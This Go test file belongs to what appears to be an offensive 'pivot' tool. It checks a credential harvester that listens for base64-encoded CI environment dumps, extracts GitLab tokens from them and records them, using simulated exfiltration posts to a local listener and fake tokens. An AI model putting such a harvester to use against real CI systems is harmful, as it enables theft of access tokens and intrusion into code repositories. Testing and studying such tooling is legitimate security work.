package pivot

import (
	"context"
	"encoding/base64"
	"fmt"
	"net/http"
	"strings"
	"testing"
	"time"
)

func TestParseEnvDump(t *testing.T) {
	envLines := "HOME=/root\nGITLAB_TOKEN=glpat-abc123def456\nPATH=/usr/bin\n"
	b64 := base64.StdEncoding.EncodeToString([]byte(envLines))

	env, err := parseEnvDump(b64)
	if err != nil {
		t.Fatal(err)
	}
	if env["HOME"] != "/root" {
		t.Errorf("HOME = %q, want /root", env["HOME"])
	}
	if env["GITLAB_TOKEN"] != "glpat-abc123def456" {
		t.Errorf("GITLAB_TOKEN = %q", env["GITLAB_TOKEN"])
	}
}

func TestParseEnvDump_Invalid(t *testing.T) {
	_, err := parseEnvDump("not-valid-base64!!!")
	if err == nil {
		t.Fatal("expected error for invalid base64")
	}
}

func TestHarvester_Callback(t *testing.T) {
	var events []HarvestEvent
	h := NewHarvester(HarvestOptions{
		ListenAddr: ":0",
		Timeout:    5 * time.Second,
		Progress: func(e HarvestEvent) {
			events = append(events, e)
		},
	})

	ctx, cancel := context.WithCancel(context.Background())

	// Start harvester in background
	resultCh := make(chan *HarvestResult, 1)
	errCh := make(chan error, 1)
	go func() {
		r, err := h.Run(ctx)
		if err != nil {
			errCh <- err
		} else {
			resultCh <- r
		}
	}()

	// Wait for server to start
	time.Sleep(200 * time.Millisecond)

	addr := h.Addr()
	if addr == "" {
		cancel()
		t.Fatal("harvester addr not set")
	}

	// Send a callback with env data
	envData := "HOME=/root\nGITLAB_TOKEN=glpat-TestHarvestToken123\nCI_JOB_TOKEN=short\n"
	b64 := base64.StdEncoding.EncodeToString([]byte(envData))

	resp, err := http.Post(fmt.Sprintf("http://%s/", addr), "text/plain", strings.NewReader(b64))
	if err != nil {
		cancel()
		t.Fatal(err)
	}
	resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		cancel()
		t.Fatalf("callback returned %d", resp.StatusCode)
	}

	// Wait a bit for processing
	time.Sleep(100 * time.Millisecond)
	cancel()

	select {
	case result := <-resultCh:
		if result.Callbacks != 1 {
			t.Errorf("expected 1 callback, got %d", result.Callbacks)
		}
	case err := <-errCh:
		t.Fatal(err)
	case <-time.After(5 * time.Second):
		t.Fatal("timeout waiting for result")
	}

	// Check credentials were extracted
	creds := h.Credentials().All()
	if len(creds) == 0 {
		t.Fatal("expected at least one credential")
	}

	found := false
	for _, c := range creds {
		if c.Token == "glpat-TestHarvestToken123" {
			found = true
			if c.TokenType != "pat" {
				t.Errorf("expected pat type, got %s", c.TokenType)
			}
			if c.SourceKey != "GITLAB_TOKEN" {
				t.Errorf("expected source key GITLAB_TOKEN, got %s", c.SourceKey)
			}
		}
	}
	if !found {
		t.Error("expected glpat-TestHarvestToken123 in harvested credentials")
	}

	// Check events
	hasCallback := false
	hasCred := false
	for _, e := range events {
		if e.Type == "callback" {
			hasCallback = true
		}
		if e.Type == "credential" {
			hasCred = true
		}
	}
	if !hasCallback {
		t.Error("expected callback event")
	}
	if !hasCred {
		t.Error("expected credential event")
	}
}

func TestHarvester_MethodNotAllowed(t *testing.T) {
	h := NewHarvester(HarvestOptions{
		ListenAddr: ":0",
		Timeout:    3 * time.Second,
	})

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() { _, _ = h.Run(ctx) }()
	time.Sleep(200 * time.Millisecond)

	addr := h.Addr()
	if addr == "" {
		t.Skip("could not determine listen address")
	}

	resp, err := http.Get(fmt.Sprintf("http://%s/", addr))
	if err != nil {
		t.Skip("could not connect to harvester")
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusMethodNotAllowed {
		t.Errorf("expected 405, got %d", resp.StatusCode)
	}
}
